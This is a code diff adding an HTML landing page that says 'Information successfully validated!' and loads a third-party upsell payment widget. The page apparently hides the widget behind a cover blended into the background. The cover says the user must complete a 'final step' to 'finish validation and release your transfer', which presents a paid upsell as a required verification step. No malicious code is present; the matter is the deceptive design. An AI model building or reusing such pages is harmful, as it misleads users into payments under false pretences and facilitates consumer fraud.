@@ -1,0 +1,97 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Information Validated</title>
+  <link rel="stylesheet" href="css/vp-upsell-cover.css">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: #0d0d0d;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .page {
+      width: 100%;
+      max-width: 390px;
+      padding: 48px 28px 56px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+    .title {
+      font-size: 30px;
+      font-weight: 900;
+      letter-spacing: -.5px;
+      line-height: 1.2;
+      margin-bottom: 32px;
+      background: linear-gradient(135deg, #fe2c55, #25f4ee);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .badge {
+      width: 150px;
+      height: 150px;
+      margin-bottom: 32px;
+      filter: drop-shadow(0 8px 24px rgba(37,244,238,0.25));
+    }
+    .subtitle {
+      font-size: 15px;
+      font-weight: 600;
+      color: #888;
+      line-height: 1.6;
+      margin-bottom: 40px;
+    }
+    #vendepay-upsell-container {
+      width: 100%;
+      border-radius: 14px;
+      overflow: hidden;
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+
+    <div class="title">Information<br>successfully validated!</div>
+
+    <svg class="badge" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <radialGradient id="g" cx="38%" cy="28%" r="65%">
+          <stop offset="0%" stop-color="#5bc8f5"></stop>
+          <stop offset="100%" stop-color="#1a8fe3"></stop>
+        </radialGradient>
+        <filter id="sh">
+          <fedropshadow dx="0" dy="6" stdDeviation="8" flood-color="rgba(30,120,220,0.4)"></fedropshadow>
+        </filter>
+      </defs>
+      <path filter="url(#sh)" fill="url(#g)" d="M100 10 L113 40 L145 28 L138 62 L172 68 L155 95 L172 122 L138 128 L145 162 L113 150 L100 180 L87 150 L55 162 L62 128 L28 122 L45 95 L28 68 L62 62 L55 28 L87 40 Z"></path>
+      <polyline points="68,100 90,122 132,78" stroke="#fff" stroke-width="14" stroke-linecap="round" stroke-linejoin="round" fill="none"></polyline>
+    </svg>
+
+    <p class="subtitle">Click the button below to<br>complete the process.</p>
+
+    <!-- Dark page: match cover bg to body so edges blend -->
+    <div class="vp-upsell-wrap" id="vendepay-upsell-wrap" style="--vp-cover-bg:#0d0d0d;--vp-cover-h:142px;">
+      <div id="vendepay-upsell-container"></div>
+      <div class="vp-green-cover" id="vp-green-cover">
+        <div class="vp-green-cover__card">
+          <p>
+            Complete this final step below to finish validation and release your transfer.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script src="js/vendepay-upsell-widget-1.0.16.js" onload="window.VendepayUpsellWidget &amp;&amp; window.VendepayUpsellWidget.showIframe('vendepay-upsell-container')">
+    </script>
+    <script src="js/vp-upsell-cover.js"></script>
+
+  </div>
+
+
+</body></html>
